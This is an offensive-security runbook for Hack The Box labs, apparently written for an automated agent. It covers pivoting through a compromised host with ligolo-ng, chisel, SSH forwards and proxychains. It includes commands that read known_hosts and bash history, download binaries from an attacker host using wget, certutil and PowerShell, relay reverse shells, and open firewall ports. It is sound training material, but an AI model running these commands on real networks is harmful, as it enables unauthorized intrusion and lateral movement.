# Pivoting & Tunneling — Multi-Host Playbook

**Use when:** You have a foothold (shell / creds) on one host and suspect —
or have proven — there is more network reachable *only from that host*. This
is the single biggest structural gap on HTB **Hard** boxes: the flag lives on
a second (or third) host on an internal segment your Kali box cannot route to.

**Produces:** A working tunnel that lets your Kali tools reach internal hosts,
plus new hypotheses in the bank for each internal host discovered.

**Assumes:** Kali attacker host. Prefer **ligolo-ng**, then **chisel**. SSH
forwards and sshuttle when you already have SSH creds.

> This is a **runbook** (deterministic, copy-paste, end-to-end), not an
> archetype checklist. For the "is this even a multi-host box?" triage, read
> `playbooks/archetypes/multi-host-pivot.md` first. For the terse operator
> loop, `knowledge-base/checklists/pivoting-checklist.md`.

---

## Variables (set once, reuse everywhere)

```bash
export TARGET="10.10.11.X"           # the foothold host (dual-homed pivot)
export ATTACKER="10.10.14.X"         # your tun0 IP (check: ip a show tun0)
export REPORTS="$HOME/.openclaw/workspace/reports/$TARGET"
mkdir -p "$REPORTS/tunnels" "$REPORTS/loot"

# run() = however you execute commands ON the foothold (ssh / rev shell / RCE)
run() { sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$TARGET" "$*"; }
```

Everything downloaded/generated for a tunnel goes under `$REPORTS/tunnels/`.

---

## Step 0 — DETECT that there IS more network behind the foothold

Do this on **every** foothold, immediately, before privesc. A second NIC or a
route to a private range you cannot reach from Kali is the tell.

```bash
# --- On the foothold (Linux) ---
run "ip -brief a; echo ---; ip route; echo ---; hostname -I"   # extra NIC / subnet?
run "arp -a 2>/dev/null; ip neigh"                             # who has this host talked to?
run "cat /etc/hosts"                                           # named internal hosts
run "cat /etc/resolv.conf"                                     # internal DNS = internal domain
run "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"        # 127.0.0.1-only ports = local-only services
run "cat ~/.ssh/known_hosts /home/*/.ssh/known_hosts 2>/dev/null"  # hosts this box SSHes to
run "cat ~/.ssh/config /home/*/.ssh/config 2>/dev/null"
run "getent hosts; cat ~/.bash_history 2>/dev/null | grep -iE 'ssh|scp|mysql|curl|rdp|psql|ftp'"
```

```cmd
:: --- On the foothold (Windows) ---
ipconfig /all                 :: second adapter / private subnet
route print
arp -a
type C:\Windows\System32\drivers\etc\hosts
netstat -ano | findstr LISTENING   :: 127.0.0.1 / internal-only listeners
```

### Signs there is a second host
- A **second interface** (`eth1`, `10.10.x.x` + `172.16.x.x`, etc.).
- A route to a private range (`172.16/12`, `192.168/16`, `10/8`) you can't
  reach from Kali.
- Services bound to `127.0.0.1` only (DB, admin panel, another web app).
- `/etc/hosts`, `known_hosts`, `resolv.conf` naming hosts you never scanned.
- App config with a DB / API host that is not the foothold IP.

### Subnet math + sweep the internal range
```bash
# Say the foothold's 2nd NIC is 172.16.5.15/24 → the segment is 172.16.5.0/24.
# From the foothold, fast host discovery WITHOUT nmap (often not installed):
run 'for i in $(seq 1 254); do (ping -c1 -W1 172.16.5.$i >/dev/null 2>&1 && echo "172.16.5.$i UP") & done; wait'

# Bash TCP port check without nmap (top ports on a live internal host):
run 'for p in 22 80 135 139 443 445 1433 3306 3389 5985 8080; do (echo >/dev/tcp/172.16.5.20/$p) >/dev/null 2>&1 && echo "172.16.5.20:$p open"; done'
```

Once a tunnel is up (below), scan properly **from Kali through it** with
`proxychains4 nmap -sT` — see the proxychains section. Do NOT try to run a full
nmap on the foothold; pivot the scan back to Kali instead.

---

## Step 1 — ligolo-ng (modern, preferred)

VPN-like: gives Kali a `tun` interface routed into the internal subnet, so
**all** your tools work natively (no proxychains, real SYN scans possible from
the tunnel's far side). Get matching proxy+agent builds from
https://github.com/nicocha30/ligolo-ng/releases.

### 1a. One-time interface setup on Kali (attacker)
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### 1b. Start the proxy on Kali
```bash
cd "$REPORTS/tunnels"
./proxy -selfcert -laddr 0.0.0.0:11601
# Drops you into the ligolo » console.
```

### 1c. Drop the agent on the foothold and connect back to Kali
```bash
# Transfer agent to the foothold (see file-transfer note below), then:
# Linux foothold:
run "./agent -connect $ATTACKER:11601 -ignore-cert &"
# Windows foothold:
#   agent.exe -connect ATTACKER:11601 -ignore-cert
```

### 1d. In the ligolo proxy console — select session & start
```text
ligolo » session
# pick the agent that just connected
ligolo » ifconfig            # read the foothold's interfaces → note the internal subnet
ligolo » start               # or: tunnel_start --tun ligolo (newer builds)
```

### 1e. Route the internal subnet through ligolo (on Kali, new terminal)
```bash
sudo ip route add 172.16.5.0/24 dev ligolo
ip route | grep ligolo       # verify
# Now Kali reaches the whole subnet directly:
nmap -sV -sC -p- --min-rate 1000 172.16.5.20
evil-winrm -i 172.16.5.20 -u user -p pass
```

### 1f. Relay a reverse shell BACK from an internal host (listener)
An internal host can't reach your Kali `10.10.14.x` directly, so relay via the
agent. In the ligolo console:
```text
ligolo » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```
Point the internal host's reverse shell at `PIVOT_INTERNAL_IP:4444`; it pops on
your Kali `nc -lvnp 4444`. Use the same trick to serve payloads/files:
```text
ligolo » listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8000 --tcp
```

### 1g. Double pivot (foothold1 → internal host2 → deeper segment)
1. Get a shell/agent onto host2 through the first tunnel.
2. On host2, run **another** agent pointed at the **first pivot's internal IP**
   (host2 can reach it), NOT your Kali IP:
   ```bash
   ./agent -connect 172.16.5.15:11601 -ignore-cert &
   ```
   To make that work, add a ligolo listener on pivot1 that forwards
   `11601 → your Kali proxy`:
   ```text
   ligolo » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
3. Back in the proxy: `session` (select host2), `start`, then add the deeper
   route on Kali:
   ```bash
   sudo ip route add 172.16.6.0/24 dev ligolo
   ```

---

## Step 2 — chisel (fallback: no tun, SOCKS/port-forward over HTTP)

Use when you can't create a tun interface, or ligolo won't run. Chisel tunnels
over a single TCP/WebSocket port (good through egress filtering). Use **matched
versions** on both ends. https://github.com/jpillora/chisel/releases

### 2a. Reverse SOCKS proxy (most common — whole subnet via proxychains)
```bash
# Kali (server):
./chisel server -p 8080 --reverse
# Foothold (client) — opens a SOCKS5 proxy on Kali:1080:
run "./chisel client $ATTACKER:8080 R:socks &"          # Linux
#   chisel.exe client ATTACKER:8080 R:socks             (Windows)
```
Then use proxychains (default `socks5 127.0.0.1 1080`) — see Step 4.

### 2b. Reverse port-forward (expose ONE internal service on Kali)
```bash
# Bring internal 172.16.5.20:80 to Kali's localhost:8000
run "./chisel client $ATTACKER:8080 R:8000:172.16.5.20:80 &"
# → http://127.0.0.1:8000 on Kali == 172.16.5.20:80
```

### 2c. Forward-mode (let an internal host reach a Kali service via the pivot)
```bash
# Foothold listens on its :9001 and forwards to Kali:9001 (e.g. reverse-shell catcher)
run "./chisel client $ATTACKER:8080 9001:127.0.0.1:9001 &"
```

---

## Step 3 — SSH forwards & sshuttle (when you have SSH creds on the pivot)

```bash
# -L  LOCAL forward: reach ONE internal service from Kali
ssh -L 8080:172.16.5.20:80 $USER@$TARGET
#   → http://127.0.0.1:8080 (Kali) == 172.16.5.20:80

# -D  DYNAMIC forward: SOCKS proxy for the WHOLE internal net
ssh -D 1080 $USER@$TARGET
#   → proxychains (socks5 127.0.0.1 1080), see Step 4

# -R  REMOTE forward: let the pivot/internal host reach back to a Kali port
ssh -R 4444:127.0.0.1:4444 $USER@$TARGET
#   → connections to TARGET:4444 arrive at Kali:4444

# Stack several + no shell + background:
ssh -fN -D 1080 -L 1433:172.16.5.30:1433 $USER@$TARGET

# sshuttle — "poor man's VPN", auto-routes a subnet over SSH, no proxychains:
sshuttle -r $USER@$TARGET 172.16.5.0/24 -x $TARGET
#   Now Kali reaches 172.16.5.0/24 natively. Add --dns to tunnel DNS too.
```

Key flags: `-f` background, `-N` no remote command, `-g` allow remote hosts to
use the local forward.

---

## Step 4 — proxychains4 (drive Kali tools through a SOCKS tunnel)

Needed for chisel-SOCKS / `ssh -D` (NOT for ligolo/sshuttle — those route
natively). Edit `/etc/proxychains4.conf` (tail):

```conf
[ProxyList]
# ligolo/sshuttle don't need this. For chisel R:socks or ssh -D 1080:
socks5 127.0.0.1 1080
# ssh -D 9050 would be:  socks5 127.0.0.1 9050
```
Keep `proxy_dns` on for name resolution; use `quiet_mode` to cut noise.

```bash
# nmap MUST be a TCP connect scan through SOCKS — SYN/UDP/ping don't traverse:
proxychains4 -q nmap -sT -Pn -n -p 22,80,135,139,443,445,1433,3306,3389,5985,8080 172.16.5.20
# Then targeted service tools:
proxychains4 -q nxc smb 172.16.5.0/24
proxychains4 -q evil-winrm -i 172.16.5.20 -u user -p pass
proxychains4 -q impacket-mssqlclient DOMAIN/user:pass@172.16.5.30
proxychains4 -q ffuf -u http://172.16.5.20/FUZZ -w /usr/share/wordlists/dirb/common.txt
proxychains4 -q xfreerdp /v:172.16.5.20 /u:user /p:pass /cert-ignore
```

**proxychains rules:** always `-sT -Pn -n` for nmap (no SYN, no ping, no DNS on
the scanner); one connection at a time is slow — scan few ports, then go deep;
tools that fork raw sockets (masscan, standard `ping`) will NOT work through it.

---

## Step 5 — Windows-side pivoting notes

When the **foothold is Windows**, ligolo `agent.exe` / `chisel.exe` still work
identically. Native alternatives when you can't drop a binary:

```cmd
:: netsh portproxy — forward an internal service to a foothold port (needs admin)
netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 ^
      connectport=80 connectaddress=172.16.5.20
:: Kali then hits  http://FOOTHOLD:9999 == 172.16.5.20:80
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=9999 listenaddress=0.0.0.0

:: Open the inbound firewall port if the host filters it
netsh advfirewall firewall add rule name="pp9999" dir=in action=allow protocol=TCP localport=9999
```

- **ligolo agent (Windows):** `agent.exe -connect ATTACKER:11601 -ignore-cert`
  — best option, gives Kali a full route just like Linux.
- **chisel.exe:** `chisel.exe client ATTACKER:8080 R:socks` — SOCKS over one
  port; pairs with proxychains.
- **Impacket / evil-winrm** to the *next* Windows host go straight through the
  ligolo route or proxychains once the tunnel is up — no extra tooling.
- Prefer ligolo/chisel over `netsh portproxy`: portproxy needs admin and only
  maps single ports; the agents give you the whole subnet.

### File transfer to stage the agent on the foothold
```bash
# Kali serves:
python3 -m http.server 8000 --directory "$REPORTS/tunnels"
# Linux foothold pulls:
run "cd /tmp && wget http://$ATTACKER:8000/agent -O agent && chmod +x agent"
# Windows foothold pulls:
#   certutil -urlcache -f http://ATTACKER:8000/agent.exe C:\Windows\Temp\agent.exe
#   powershell -c "iwr http://ATTACKER:8000/agent.exe -OutFile C:\Windows\Temp\agent.exe"
```

---

## Decision table — situation → technique

| Situation | Use |
|---|---|
| Want the whole internal subnet, native tools, real nmap | **ligolo-ng** (`ip route add … dev ligolo`) |
| Can't make a tun / restrictive host, need SOCKS for many hosts | **chisel** `R:socks` + proxychains |
| Only need ONE internal service exposed on Kali | **chisel** `R:8000:host:port`, or `ssh -L`, or `netsh portproxy` |
| Already have SSH creds on the pivot | `ssh -D` (SOCKS) / `ssh -L` / **sshuttle** (whole subnet, no proxychains) |
| Need an internal host's reverse shell to reach Kali | ligolo `listener_add` / `ssh -R` / chisel forward-mode |
| Windows foothold, no binary drop possible | `netsh portproxy` (single port, admin) |
| Windows foothold, can drop a binary | `agent.exe` (ligolo) or `chisel.exe R:socks` |
| Second internal host is itself dual-homed (deeper segment) | **ligolo double pivot** (agent → pivot1 internal IP) |
| Tool uses raw sockets (masscan, SYN nmap, ping) | ligolo/sshuttle only — proxychains can't carry raw sockets |

---

## Step 6 — Integrate with the hypothesis bank

Finding internal hosts is a **phase transition**, not a footnote. Record it so
the loop keeps driving:

1. **Log the discovery** as a concrete orchestrator result:
   ```bash
   bash scripts/orchestrator.sh report "Foothold is dual-homed: eth1 172.16.5.15/24. Ping sweep found 172.16.5.20 (445/5985) and 172.16.5.30 (1433). Pivoting required."
   ```
2. **Update `reports/$TARGET/target-model.md`:** add an "Internal network"
   section — the segment(s), each live host, its open ports, and a bold
   **"PIVOTING REQUIRED — see playbooks/pivoting-and-tunneling.md"** note so the
   next iteration knows Kali can't reach these directly.
3. **Add one hypothesis per internal host** to the bank (H1/H2/H3 style), e.g.:
   - H: `172.16.5.20` is a Windows box (445/5985) → reuse foothold creds via
     `nxc smb` through the tunnel → evil-winrm.
   - H: `172.16.5.30` runs MSSQL (1433) → `sa`/reused creds → `xp_cmdshell`.
4. **Establish the tunnel first** (this playbook), then treat each internal host
   as a fresh target: match it to an archetype and enumerate it **through the
   tunnel** exactly as you would a direct target.
5. Keep tunnel artifacts (binaries, `chisel`/`proxy` commands, routes added) in
   `reports/$TARGET/tunnels/` and note the exact route/listener lines in
   `notes.md` so a dropped tunnel is rebuilt in seconds.

---

## Common pitfalls

1. **Skipping Step 0.** Privesc-ing the foothold to root and *then* noticing the
   flag is on another host wastes the most time. Check for a 2nd NIC first.
2. **Full nmap on the foothold.** Slow, noisy, often no nmap installed. Do a
   bash ping/port sweep to confirm live hosts, then scan *from Kali through the
   tunnel*.
3. **proxychains + SYN scan.** `nmap` through SOCKS must be `-sT -Pn -n`. SYN,
   UDP, `-sn` ping, and raw-socket tools silently fail or lie.
4. **Version mismatch** between chisel/ligolo client and server → silent
   disconnects. Ship the matching pair from the same release.
5. **Reverse shell from an internal host pointed at Kali's `10.10.14.x`.** It
   can't route there. Point it at the pivot's internal IP + a ligolo/ssh -R
   listener that relays back.
6. **Forgetting the route direction.** `ip route add … dev ligolo` is the
   *internal* subnet, not the foothold's HTB IP. Adding the wrong subnet
   blackholes your VPN.
7. **Leaving the tunnel undocumented.** Tunnels die when the shell dies. Write
   the exact rebuild commands into `notes.md`.

## Cleanup

```bash
sudo ip route del 172.16.5.0/24 dev ligolo 2>/dev/null
sudo ip link set ligolo down 2>/dev/null; sudo ip tuntap del mode tun ligolo 2>/dev/null
# kill agent/chisel on the foothold; remove staged binaries from /tmp or C:\Windows\Temp
run "pkill -f agent; pkill -f chisel; rm -f /tmp/agent /tmp/chisel"
```
